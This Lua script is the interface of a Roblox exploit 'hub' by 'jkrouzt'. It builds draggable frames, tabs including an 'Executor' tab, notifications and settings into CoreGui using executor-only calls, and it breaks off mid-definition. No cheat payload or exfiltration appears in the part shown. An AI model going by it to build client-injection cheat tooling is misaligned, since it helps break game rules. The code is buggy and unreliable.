-- Open Source for everyone who want to edit this script or not
-- Dont touch anything if you dont know anything about this script below
-- Made by jkrouzt. made with Mobile device in China
-- This script will always continued after the full version is done or V1 (just want to learn roblox scripting bruu)

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer
local localPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local lighting = game:GetService("Lighting")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LogService = game:GetService("LogService")

makefolder("jksettings")
local ckTeam
local backinamage
local orbitzxc
local sigmb

local screenGui = Instance.new("ScreenGui")
local tab1 = Instance.new("TextButton")
local tab2 = Instance.new("TextButton")
local tab3 = Instance.new("TextButton")
local tab4 = Instance.new("TextButton")
local mainFrame = Instance.new("Frame")
local imageLabel = Instance.new("ImageLabel")
local titleFrame = Instance.new("Frame")

screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.CoreGui
screenGui.Name = "Jkrouzt Hub"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

mainFrame.Parent = screenGui
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 650, 0, 35)
mainFrame.Position = UDim2.new(0.35, 0, 0.305, 0)
mainFrame.AnchorPoint = Vector2.new(0.3, 1)
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderColor3 = Color3.new(255, 0, 0)
mainFrame.BorderSizePixel = 2
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Visible = false

function QFCS_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', mainFrame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(QFCS_fake_script)()

ckTeam = Instance.new("ImageLabel")
ckTeam.Size = UDim2.new(0, 70, 0, 70)
ckTeam.Position = UDim2.new(0, 20, 1, -20) 
ckTeam.AnchorPoint = Vector2.new(0, 1) 
ckTeam.BackgroundTransparency = 1 
ckTeam.Image = "rbxassetid://87459933248527"
ckTeam.Parent = screenGui
ckTeam.ScaleType = Enum.ScaleType.Fit 
ckTeam.BorderSizePixel = 0 
ckTeam.Name = "ckTeam" 
ckTeam.ZIndex = 2
ckTeam.Visible = true


game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
    ckTeam.Rotation = ckTeam.Rotation + 0.1 * deltaTime * 360
end)

backinamage = Instance.new("ImageLabel")
backinamage.Size = UDim2.new(0, 150, 0, 150)
backinamage.Position = UDim2.new(0, -20, 1, 20) 
backinamage.AnchorPoint = Vector2.new(0, 1) 
backinamage.BackgroundTransparency = 1 
backinamage.Image = "rbxassetid://114807955749711"
backinamage.ImageColor3 = Color3.new(10, 0, 0)
backinamage.Parent = screenGui
backinamage.ScaleType = Enum.ScaleType.Fit 
backinamage.BorderSizePixel = 0 
backinamage.Name = "background1"
backinamage.ZIndex = 1
backinamage.Visible = true


game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
    backinamage.Rotation = backinamage.Rotation + 0.1 * deltaTime * 540
end)

orbitzxc = Instance.new("ImageLabel")
orbitzxc.Size = UDim2.new(0, 150, 0, 150)
orbitzxc.Position = UDim2.new(0, -20, 1, 20) 
orbitzxc.AnchorPoint = Vector2.new(0, 1) 
orbitzxc.BackgroundTransparency = 1 
orbitzxc.Image = "rbxassetid://2312119891"
orbitzxc.ImageColor3 = Color3.new(10, 0, 0)
orbitzxc.Parent = screenGui
orbitzxc.ScaleType = Enum.ScaleType.Fit 
orbitzxc.BorderSizePixel = 0 
orbitzxc.Name = "background2"
orbitzxc.ZIndex = 0
orbitzxc.Visible = true


startTime = tick()
rotationAmplitude = 90
rotationCenter = 720
rotationSpeed = 1.5

game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
    timeElapsed = tick() - startTime
    orbitzxc.Rotation = rotationCenter + rotationAmplitude * math.sin(timeElapsed * rotationSpeed)
end)

sigmb = Instance.new("ImageLabel")
sigmb.Size = UDim2.new(0, 150, 0, 150)
sigmb.Position = UDim2.new(0, -20, 1, 20) 
sigmb.AnchorPoint = Vector2.new(0, 1) 
sigmb.BackgroundTransparency = 1 
sigmb.Image = "rbxassetid://2325939897"
sigmb.ImageColor3 = Color3.new(10, 0, 0)
sigmb.Parent = screenGui
sigmb.ScaleType = Enum.ScaleType.Fit 
sigmb.BorderSizePixel = 0 
sigmb.Name = "background3"
sigmb.ZIndex = 1
sigmb.Visible = true


game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
    sigmb.Rotation = sigmb.Rotation + 0.1 * deltaTime * 180
end)

titleFrame.Parent = mainFrame
titleFrame.Name = "titleFrame"
titleFrame.Size = UDim2.new(0, 650, 0, 70)
titleFrame.Position = UDim2.new(0, 0, 0, 0)
titleFrame.BackgroundColor3 = Color3.new(0, 0, 0)
titleFrame.BorderColor3 = Color3.new(255, 0, 0)
titleFrame.BorderSizePixel = 2
titleFrame.Visible = true

local hom = Instance.new("Frame")
hom.Parent = titleFrame
hom.Name = "hom"
hom.Size = UDim2.new(0, 650, 0, 51)
hom.Position = UDim2.new(0, 0, 0.55, 0)
hom.BackgroundColor3 = Color3.new(0, 0, 0)
hom.BorderColor3 = Color3.new(255, 0, 0)
hom.BorderSizePixel = 2
hom.Visible = true

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = mainFrame
titleLabel.Name = "titleLabel" 
titleLabel.Size = UDim2.new(1, 0, 1.1, 0)
titleLabel.Position = UDim2.new(0, 10, 0, 0)
titleLabel.BackgroundColor3 = Color3.new(0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.BorderColor3 = Color3.new(0, 0, 0)
titleLabel.BorderSizePixel = 1
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.Arcade
titleLabel.Text = "Jkrouzt Hub"
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center

ui = Instance.new("UIGradient")
ui.Parent = titleLabel
ui.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.new(0.1, 0, 0))
})

titleLabel = Instance.new("TextLabel")
titleLabel.Parent = mainFrame
titleLabel.Name = "titleLabel" 
titleLabel.Size = UDim2.new(1, 0, 1.1, 0)
titleLabel.Position = UDim2.new(0, 10, 0, 5)
titleLabel.BackgroundColor3 = Color3.new(0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.BorderColor3 = Color3.new(0, 0, 0)
titleLabel.BorderSizePixel = 1
titleLabel.TextColor3 = Color3.new(150, 0, 0)
titleLabel.TextScaled = true
titleLabel.TextTransparency = 0.5
titleLabel.Font = Enum.Font.Arcade
titleLabel.Text = "Jkrouzt Hub"
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center

local minimizeButton = Instance.new("TextButton")
minimizeButton.Parent = mainFrame
minimizeButton.Name = "MinimizeButton"
minimizeButton.Text = "-"
minimizeButton.TextColor3 = Color3.new(255, 255, 255)
minimizeButton.TextScaled = true
minimizeButton.Size = UDim2.new(0, 50, 0, 35) 
minimizeButton.Position = UDim2.new(0.915, 0, 0, 0) 
minimizeButton.AnchorPoint = Vector2.new(0, 0)
minimizeButton.BackgroundColor3 = Color3.new(0, 0, 0)
minimizeButton.BorderColor3 = Color3.new(255, 0, 0)
minimizeButton.BorderSizePixel = 2

minimizeButton.MouseButton1Click:Connect(function()
    if titleFrame.Visible then
        titleFrame.Visible = false
        minimizeButton.Text = "+"
    else
        titleFrame.Visible = true  
        minimizeButton.Text = "-"
    end
end)

core = Instance.new("ScreenGui")
core.Parent = game.CoreGui
core.Name = "CoreGui"

local openui = Instance.new("TextButton")
openui.Parent = core
openui.Text = ">"
openui.TextColor3 = Color3.new(1, 1, 1)
openui.TextScaled = true
openui.Size = UDim2.new(0, 50, 0, 50)
openui.Position = UDim2.new(0, 10, 0.5, -50)
openui.BackgroundColor3 = Color3.new(0, 0, 0)
openui.BackgroundTransparency = 0
openui.BorderColor3 = Color3.new(1, 0, 0)
openui.BorderSizePixel = 2
openui.Visible = true
openui.Active = true

isVisible = true
local initialPosition = UDim2.new(-0.600000006, 0, 0, 100)
local MainPosi = UDim2.new(0.375, 0, 0.200000003, 0)
local animationDuration = 0.4
local tweenInfo = TweenInfo.new(animationDuration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local tweenInfoOut = TweenInfo.new(animationDuration, Enum.EasingStyle.Back, Enum.EasingDirection.In)

function animateGui(target, goalPosition, tweenInfo)
    local tween = TweenService:Create(target, tweenInfo, {Position = goalPosition})
    tween:Play()
end


function toggleGUI()
    isVisible = not isVisible
    mainFrame.Visible = isVisible
    if isVisible then
        openui.Text = "<"
        animateGui(mainFrame, MainPosi, tweenInfo)
    else
        openui.Text = ">"
        animateGui(mainFrame, initialPosition, tweenInfoOut)
    end
end

openui.MouseButton1Click:Connect(toggleGUI)

if mainFrame.Visible then
    animateGui(mainFrame, MainPosi, tweenInfo)
else
        animateGui(mainFrame, initialPosition, tweenInfoOut)
end

Corrn = Instance.new("UICorner")
Corrn.Parent = openui
Corrn.CornerRadius = UDim.new(20, 20)

corg = Instance.new("UIStroke")
corg.Parent = openui
corg.ApplyStrokeMode = "Border"
corg.Color = Color3.fromRGB(200, 0, 0)
corg.LineJoinMode = "Round"
corg.Thickness = 2

orgg = Instance.new("UIGradient")
orgg.Parent = corg
orgg.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), 
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)) 
})

sizh = Instance.new("UISizeConstraint")
sizh.Parent = openui
sizh.MaxSize = Vector2.new(150, 150)
sizh.MinSize = Vector2.new(10, 50)

local destroyButton = Instance.new("TextButton")
destroyButton.Parent = mainFrame
destroyButton.Name = "DestroyButton"
destroyButton.Text = "X"
destroyButton.TextScaled = true
destroyButton.TextColor3 = Color3.new(1, 1, 1)
destroyButton.Size = UDim2.new(0, 50, 0, 35) 
destroyButton.Position = UDim2.new(0.92, 0, 0, 0)
minimizeButton.AnchorPoint = Vector2.new(5, 0)
destroyButton.BackgroundColor3 = Color3.new(0, 0, 0)
destroyButton.BorderColor3 = Color3.new(255, 0, 0)
destroyButton.BorderSizePixel = 2
destroyButton.MouseButton1Click:Connect(function()
    screenGui:Destroy() 
    openui:Destroy()
end)

local exec = Instance.new("Frame")
exec.Parent = hom
exec.Name = "exec"
exec.Size = UDim2.new(0, 650, 0, 270)
exec.Position = UDim2.new(0, 0, 0.53, 0)
exec.BackgroundColor3 = Color3.new(0, 0, 0)
exec.BorderColor3 = Color3.new(255, 0, 0)
exec.BorderSizePixel = 2
exec.Visible = false 

local home = Instance.new("Frame")
home.Parent = hom
home.Name = "home"
home.Size = UDim2.new(0, 650, 0, 270)
home.Position = UDim2.new(0, 0, 0.53, 0)
home.BackgroundColor3 = Color3.new(0, 0, 0)
home.BorderColor3 = Color3.new(255, 0, 0)
home.BorderSizePixel = 2
home.Visible = true

local sc = Instance.new("Frame")
sc.Parent = hom
sc.Name = "script"
sc.Size = UDim2.new(0, 650, 0, 270)
sc.Position = UDim2.new(0, 0, 0.53, 0)
sc.BackgroundColor3 = Color3.new(0, 0, 0)
sc.BorderColor3 = Color3.new(255, 0, 0)
sc.BorderSizePixel = 2
sc.Visible = false

local Others = Instance.new("Frame")
Others.Parent = hom
Others.Name = "Others"
Others.Size = UDim2.new(0, 650, 0, 270)
Others.Position = UDim2.new(0, 0, 0.53, 0)
Others.BackgroundColor3 = Color3.new(0, 0, 0)
Others.BorderColor3 = Color3.new(255, 0, 0)
Others.BorderSizePixel = 2
Others.Visible = false

Lastshit = Instance.new("ScrollingFrame")
Lastshit.Parent = hom
Lastshit.Name = "Lastshit"
Lastshit.Size = UDim2.new(0, 650, 0, 270)
Lastshit.Position = UDim2.new(0, 0, 0.53, 0)
Lastshit.BackgroundColor3 = Color3.new(0, 0, 0)
Lastshit.BorderColor3 = Color3.new(255, 0, 0)
Lastshit.BorderSizePixel = 2
Lastshit.CanvasSize = UDim2.new(0, 500, 0, 700)
Lastshit.ScrollBarThickness = 10
Lastshit.ScrollBarImageColor3 = Color3.new(255, 0, 0)
Lastshit.ElasticBehavior = Enum.ElasticBehavior.Never
Lastshit.ScrollingDirection = Enum.ScrollingDirection.Y
Lastshit.ScrollBarImageTransparency = 0
Lastshit.Visible = false

tab1.Parent = hom
tab1.Text = "Home"
tab1.TextYAlignment = Enum.TextYAlignment.Center
tab1.Font = Enum.Font.SciFi
tab1.TextScaled = true
tab1.TextColor3 = Color3.new(255, 255, 255)
tab1.Size = UDim2.new(0, 150, 0, 23)
tab1.Position = UDim2.new(0, 0, 0, 0)
tab1.BackgroundColor3 = Color3.new(0, 0, 0) 
tab1.BackgroundTransparency = 0
tab1.BorderSizePixel = 2.5
tab1.BorderColor3 = Color3.new(255, 0, 0)
tab1.MouseButton1Click:Connect(function()
home.Visible = true
tab1.BorderColor3 = Color3.new(255, 255, 255)
exec.Visible = false
tab2.BorderColor3 = Color3.new(255, 0, 0)
sc.Visible = false
tab3.BorderColor3 = Color3.new(255, 0, 0)
Others.Visible = false
tab4.BorderColor3 = Color3.new(255, 0, 0)
Lastshit.Visible = false
tab5.BorderColor3 = Color3.new(255, 0, 0)
end)

tab2.Parent = hom
tab2.Text = "Executor"
tab2.TextYAlignment = Enum.TextYAlignment.Center
tab2.Font = Enum.Font.SciFi
tab2.TextScaled = true
tab2.TextColor3 = Color3.new(255, 255, 255)
tab2.Size = UDim2.new(0, 150, 0, 23)
tab2.Position = UDim2.new(0, 150, 0, 0)
tab2.BackgroundColor3 = Color3.new(0, 0, 0)
tab2.BackgroundTransparency = 0
tab2.BorderSizePixel = 2.5
tab2.BorderColor3 = Color3.new(255, 0, 0)
tab2.MouseButton1Click:Connect(function()
home.Visible = false
tab1.BorderColor3 = Color3.new(255, 0, 0)
exec.Visible = true
tab2.BorderColor3 = Color3.new(255, 255, 255)
sc.Visible = false
tab3.BorderColor3 = Color3.new(255, 0, 0)
Others.Visible = false
tab4.BorderColor3 = Color3.new(255, 0, 0)
Lastshit.Visible = false
tab5.BorderColor3 = Color3.new(255, 0, 0)
end)

tab3.Parent = hom
tab3.Text = "Scripts"
tab3.TextYAlignment = Enum.TextYAlignment.Center
tab3.Font = Enum.Font.SciFi
tab3.TextScaled = true
tab3.TextColor3 = Color3.new(255, 255, 255)
tab3.Size = UDim2.new(0, 150, 0, 23)
tab3.Position = UDim2.new(0, 300, 0, 0)
tab3.BackgroundColor3 = Color3.new(0, 0, 0) 
tab3.BackgroundTransparency = 0
tab3.BorderSizePixel = 2.5
tab3.BorderColor3 = Color3.new(255, 0, 0)
tab3.MouseButton1Click:Connect(function()
home.Visible = false
tab1.BorderColor3 = Color3.new(255, 0, 0)
exec.Visible = false
tab2.BorderColor3 = Color3.new(255, 0, 0)
sc.Visible = true
tab3.BorderColor3 = Color3.new(255, 255, 255)
Others.Visible = false
tab4.BorderColor3 = Color3.new(255, 0, 0)
Lastshit.Visible = false
tab5.BorderColor3 = Color3.new(255, 0, 0)
end)

tab4.Parent = hom
tab4.Text = "Other"
tab4.TextYAlignment = Enum.TextYAlignment.Center
tab4.Font = Enum.Font.SciFi
tab4.TextScaled = true
tab4.TextColor3 = Color3.new(255, 255, 255)
tab4.Size = UDim2.new(0, 150, 0, 23)
tab4.Position = UDim2.new(0, 450, 0, 0)
tab4.BackgroundColor3 = Color3.new(0, 0, 0) 
tab4.BackgroundTransparency = 0
tab4.BorderSizePixel = 2.5
tab4.BorderColor3 = Color3.new(255, 0, 0)
tab4.MouseButton1Click:Connect(function()
home.Visible = false
tab1.BorderColor3 = Color3.new(255, 0, 0)
exec.Visible = false
tab2.BorderColor3 = Color3.new(255, 0, 0)
sc.Visible = false
tab3.BorderColor3 = Color3.new(255, 0, 0)
Others.Visible = true
tab4.BorderColor3 = Color3.new(1, 1, 1)
Lastshit.Visible = false
tab5.BorderColor3 = Color3.new(255, 0, 0)
end)

tab5 = Instance.new("ImageButton")
tab5.Parent = hom
tab5.Image = "rbxassetid://13775586461"
tab5.Position = UDim2.new(0, 600, 0, 0)
tab5.Size = UDim2.new(0.0750000104, 0, 0, 23)
tab5.BackgroundColor3 = Color3.new(0, 0, 0) 
tab5.BackgroundTransparency = 0
tab5.BorderSizePixel = 2.5
tab5.BorderColor3 = Color3.new(255, 0, 0)
tab5.ScaleType = Enum.ScaleType.Fit
tab5.AutoButtonColor = true
tab5.MouseButton1Click:Connect(function()
home.Visible = false
tab1.BorderColor3 = Color3.new(255, 0, 0)
exec.Visible = false
tab2.BorderColor3 = Color3.new(255, 0, 0)
sc.Visible = false
tab3.BorderColor3 = Color3.new(255, 0, 0)
Others.Visible = false
tab4.BorderColor3 = Color3.new(255, 0, 0)
Lastshit.Visible = true
tab5.BorderColor3 = Color3.new(1, 1, 1)
end)


local mainFrame = Instance.new("ScreenGui")
mainFrame.Parent = game.CoreGui
mainFrame.IgnoreGuiInset = true

local TweenService = game:GetService("TweenService")
local time = 0.6
local ignor = {}
local spac = 10
local fpos = UDim2.new(1.5, 0, 0.945, 5)

function animateFrame(frame, targetP, callback)
	local tweenInfo = TweenInfo.new(
		time,
		Enum.EasingStyle.Back,
		Enum.EasingDirection.Out,
		0,
		false
	)

	local two = TweenService:Create(frame, tweenInfo, {Position = targetP})
	if callback then
		two.Completed:Connect(callback)
	end
	two:Play()
end

function notif(params)
	local imageAssetId = params.Image
	local mainText = params.Text
	local buttonText = params.ButtonText
	local buttonCallback = params.ButtonCallback
	local duration = params.Duration or 3
	local topmt = params.topm

	local MSG = Instance.new("Frame")
	MSG.Name = "NotificationFrame"
	MSG.Size = UDim2.new(0, 300, 0, 100)
	MSG.BackgroundTransparency = 0
	MSG.BackgroundColor3 = Color3.new(0, 0, 0)
	MSG.BorderColor3 = Color3.new(1, 0, 0)
	MSG.BorderSizePixel = 2
	MSG.Visible = true
	MSG.Parent = mainFrame

	local topBar = Instance.new("Frame")
	topBar.Name = "TopBar"
	topBar.Size = UDim2.new(1, 0, 0.2, 0)
	topBar.Position = UDim2.new(0, 0, 0, 0)
	topBar.AnchorPoint = Vector2.new(0, 0)
	topBar.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
	topBar.BorderSizePixel = 1
	topBar.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
	topBar.Parent = MSG

	local messeg = Instance.new("TextLabel")
	messeg.Name = "messeg"
	messeg.Size = UDim2.new(1, 0, 1, 0)
	messeg.Position = UDim2.new(0, 0, 0, 0)
	messeg.AnchorPoint = Vector2.new(0, 0)
	messeg.Text = topmt
	messeg.TextColor3 = Color3.new(1, 0, 0)
	messeg.BackgroundTransparency = 1
	messeg.Font = Enum.Font.GothamBold
	messeg.TextScaled = true
	messeg.TextXAlignment = Enum.TextXAlignment.Center
	messeg.TextYAlignment = Enum.TextYAlignment.Center
	messeg.Parent = topBar

	local yOffset = 0
	for _, existingNotification in ipairs(ignor) do
		yOffset = yOffset + existingNotification.AbsoluteSize.Y + spac
	end
	local targetYPosition = UDim2.new(0, 0, 1.2, -MSG.Size.Y.Offset - 10 - yOffset)
	MSG.AnchorPoint = Vector2.new(1, 1)
	MSG.Position = fpos

	local getout = Instance.new("TextButton")
	getout.Name = "getout"
	getout.Size = UDim2.new(0.20, 0, 1, 0)
	getout.Position = UDim2.new(0, 240, 0, 0)
	getout.AnchorPoint = Vector2.new(0, 0)
	getout.Text = "X"
	getout.TextColor3 = Color3.new(1, 0, 0)
	getout.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
	getout.BorderColor3 = Color3.new(1, 0, 0)
	getout.BorderSizePixel = 1
	getout.Font = Enum.Font.DenkOne
	getout.TextScaled = true
	getout.TextXAlignment = Enum.TextXAlignment.Center
	getout.TextYAlignment = Enum.TextYAlignment.Center
	getout.Parent = topBar

	getout.MouseButton1Click:Connect(function()
		animateFrame(MSG, UDim2.new(1.3, MSG.Size.X.Offset + 10, targetYPosition.Y.Scale, targetYPosition.Y.Offset), function()
			MSG:Destroy()
			for i = #ignor, 1, -1 do
				if ignor[i] == MSG then
					table.remove(ignor, i)
					break
				end
			end
			local newYOffset = 0
			for _, remainingNotification in ipairs(ignor) do
				local targetNewY = UDim2.new(0, 0, 1.25, -remainingNotification.Size.Y.Offset - 10 - newYOffset)
				animateFrame(remainingNotification, UDim2.new(remainingNotification.Position.X.Scale, remainingNotification.Position.X.Offset, targetNewY.Y.Scale, targetNewY.Y.Offset))
				newYOffset = newYOffset + remainingNotification.AbsoluteSize.Y + spac
			end
		end)
	end)

	if imageAssetId then
		local ep0kim = Instance.new("ImageLabel")
		ep0kim.Name = "NotificationImage"
		ep0kim.Size = UDim2.new(0, 80, 0, 80)
		ep0kim.Position = UDim2.new(0.05, 0, 0.1, 0)
		ep0kim.AnchorPoint = Vector2.new(0, 0)
		ep0kim.BackgroundTransparency = 1
		ep0kim.Image = "rbxassetid://" .. tostring(imageAssetId)
		ep0kim.Parent = MSG
	end

	local send = Instance.new("TextLabel")
	send.Name = "NotificationText"
	local textXOffset = imageAssetId and 0.35 or 0.05
	local textSizeX = imageAssetId and 0.6 or 0.9
	send.Size = UDim2.new(textSizeX, 0, 0.8, 0)
	send.Position = UDim2.new(textXOffset, 0, 0.2, 0)
	send.AnchorPoint = Vector2.new(0, 0)
	send.Text = mainText
	send.TextSize = 38
	send.TextColor3 = Color3.new(1, 1, 1)
	send.BackgroundTransparency = 1
	send.Font = Enum.Font.SourceSansBold
	send.TextXAlignment = Enum.TextXAlignment.Left
	send.TextYAlignment = Enum.TextYAlignment.Top
	send.TextScaled = true
	send.RichText = true
	send.Parent = MSG

	if buttonText and buttonCallback then
		local notifbutton = Instance.new("TextButton")
		notifbutton.Name = "notifbutton"
		notifbutton.Size = UDim2.new(0, 80, 0, 30)
		notifbutton.Position = UDim2.new(0.85, 0, 0.6, 0)
		notifbutton.AnchorPoint = Vector2.new(1, 0.5)
		notifbutton.Text = buttonText
		notifbutton.TextColor3 = Color3.new(1, 1, 1)
		notifbutton.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
		notifbutton.BorderSizePixel = 0
		notifbutton.Font = Enum.Font.SourceSansBold
		notifbutton.TextScaled = true
		notifbutton.Parent = MSG
		notifbutton.MouseButton1Click:Connect(buttonCallback)
	end

	table.insert(ignor, MSG)
	animateFrame(MSG, UDim2.new(1.3, -MSG.Size.X.Offset - 10, targetYPosition.Y.Scale, targetYPosition.Y.Offset))

delay(duration, function()
		if MSG and MSG.Parent then
			animateFrame(MSG, fpos, function()
				if MSG then
					MSG:Destroy()
					for i = #ignor, 1, -1 do
						if ignor[i] == MSG then
							table.remove(ignor, i)
							break
						end
					end
					local newYOffset = 0
					for _, remainingNotification in ipairs(ignor) do
						local targetNewY = UDim2.new(0, 0, 1.15, -remainingNotification.Size.Y.Offset - 10 - newYOffset)
						animateFrame(remainingNotification, UDim2.new(remainingNotification.Position.X.Scale, remainingNotification.Position.X.Offset, targetNewY.Y.Scale, targetNewY.Y.Offset))
						newYOffset = newYOffset + remainingNotification.AbsoluteSize.Y + spac
					end
				end
			end)
		end
	end)
end

sething = Instance.new("TextLabel")
sething.Parent = Lastshit
sething.Name = "sething"
sething.Size = UDim2.new(1.01800001, 0, 0.100000001, 0)
sething.Position = UDim2.new(0, 0, 0, 0)
sething.BackgroundColor3 = Color3.new(0, 0, 0)
sething.BackgroundTransparency = 0
sething.BorderColor3 = Color3.new(255, 0, 0)
sething.BorderSizePixel = 3
sething.TextColor3 = Color3.new(1, 1, 1)
sething.TextStrokeColor3 = Color3.new(255, 0, 0)
sething.TextStrokeTransparency = 0.8
sething.TextScaled = true
sething.Font = Enum.Font.Michroma
sething.Text = "Settings"
sething.TextXAlignment = Enum.TextXAlignment.Left
sething.TextYAlignment = Enum.TextYAlignment.Center

settingf1tex = Instance.new("TextLabel")
settingf1tex.Name = "skipshit"
settingf1tex.Size = UDim2.new(0, 200, 0, 50)
settingf1tex.Position = UDim2.new(0, 325, 0, 65)
settingf1tex.AnchorPoint = Vector2.new(0, 0)
settingf1tex.Text = "Skip Intro:"
settingf1tex.TextColor3 = Color3.new(1, 1, 1)
settingf1tex.BackgroundTransparency = 1
settingf1tex.Font = Enum.Font.Fantasy
settingf1tex.TextScaled = true
settingf1tex.TextXAlignment = Enum.TextXAlignment.Center
settingf1tex.TextYAlignment = Enum.TextYAlignment.Center
settingf1tex.Parent = Lastshit

settingf2tex = Instance.new("TextLabel")
settingf2tex.Name = "Remove logo"
settingf2tex.Size = UDim2.new(0, 200, 0, 50)
settingf2tex.Position = UDim2.new(0, 0, 0, 65)
settingf2tex.AnchorPoint = Vector2.new(0, 0)
settingf2tex.Text = "Remove Logo:"
settingf2tex.TextColor3 = Color3.new(1, 1, 1)
settingf2tex.BackgroundTransparency = 1
settingf2tex.Font = Enum.Font.Fantasy
settingf2tex.TextScaled = true
settingf2tex.TextXAlignment = Enum.TextXAlignment.Center
settingf2tex.TextYAlignment = Enum.TextYAlignment.Center
settingf2tex.Parent = Lastshit

settingf3tex = Instance.new("TextLabel")
settingf3tex.Name = "sst profilsh"
settingf3tex.Size = UDim2.new(0, 200, 0, 50)
settingf3tex.Position = UDim2.new(0, 325, 0, 120)
settingf3tex.AnchorPoint = Vector2.new(0, 0)
settingf3tex.Text = "Set Profile:"
settingf3tex.TextColor3 = Color3.new(1, 1, 1)
settingf3tex.BackgroundTransparency = 1
settingf3tex.Font = Enum.Font.Fantasy
settingf3tex.TextScaled = true
settingf3tex.TextXAlignment = Enum.TextXAlignment.Center
settingf3tex.TextYAlignment = Enum.TextYAlignment.Center
settingf3tex.Parent = Lastshit

settingf5tex = Instance.new("TextLabel")
settingf5tex.Name = "Visiblity"
settingf5tex.Size = UDim2.new(0, 200, 0, 50)
settingf5tex.Position = UDim2.new(0, 325, 0, 180)
settingf5tex.AnchorPoint = Vector2.new(0, 0)
settingf5tex.Text = "UI Toggle Visibility:"
settingf5tex.TextColor3 = Color3.new(1, 1, 1)
settingf5tex.BackgroundTransparency = 1
settingf5tex.Font = Enum.Font.Fantasy
settingf5tex.TextScaled = true
settingf5tex.TextXAlignment = Enum.TextXAlignment.Center
settingf5tex.TextYAlignment = Enum.TextYAlignment.Center
settingf5tex.Parent = Lastshit

settingf4tex = Instance.new("TextLabel")
settingf4tex.Name = "Keybindxzc"
settingf4tex.Size = UDim2.new(0, 200, 0, 50)
settingf4tex.Position = UDim2.new(0, 55, 0, 110)
settingf4tex.AnchorPoint = Vector2.new(0, 0)
settingf4tex.Text = "UI Keybind:"
settingf4tex.TextColor3 = Color3.new(1, 1, 1)
settingf4tex.BackgroundTransparency = 1
settingf4tex.Font = Enum.Font.Fantasy
settingf4tex.TextScaled = true
settingf4tex.TextXAlignment = Enum.TextXAlignment.Center
settingf4tex.TextYAlignment = Enum.TextYAlignment.Center
settingf4tex.Parent = Lastshit

settingf1 = Instance.new("TextButton")
settingf1.Name = "settingf1"
settingf1.Parent = Lastshit
settingf1.Size = UDim2.new(0, 100, 0, 30)
settingf1.Position = UDim2.new(0, 535, 0, 75)
settingf1.Text = ""
settingf1.TextScaled = true
settingf1.Font = Enum.Font.Code
settingf1.TextColor3 = Color3.new(1, 1, 1)
settingf1.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
settingf1.BorderColor3 = Color3.new(1, 0, 0)
settingf1.BorderSizePixel = 3

setf1b = Instance.new("Frame")
setf1b.Name = "setf1b"
setf1b.Parent = settingf1
setf1b.Size = UDim2.new(0.4, 0, 0.8, 0)
setf1b.Position = UDim2.new(0.1, 0, 0.1, 0)
setf1b.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
setf1b.BorderSizePixel = 0
setf1b.AnchorPoint = Vector2.new(0.5, 0.5)
setf1b.Position = UDim2.new(0.25,0,0.5,0)

settingf2 = Instance.new("TextButton")
settingf2.Name = "settingf2"
settingf2.Parent = Lastshit
settingf2.Size = UDim2.new(0, 100, 0, 30)
settingf2.Position = UDim2.new(0, 205, 0, 75)
settingf2.Text = ""
settingf2.TextScaled = true
settingf2.Font = Enum.Font.Code
settingf2.TextColor3 = Color3.new(1, 1, 1)
settingf2.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
settingf2.BorderColor3 = Color3.new(1, 0, 0)
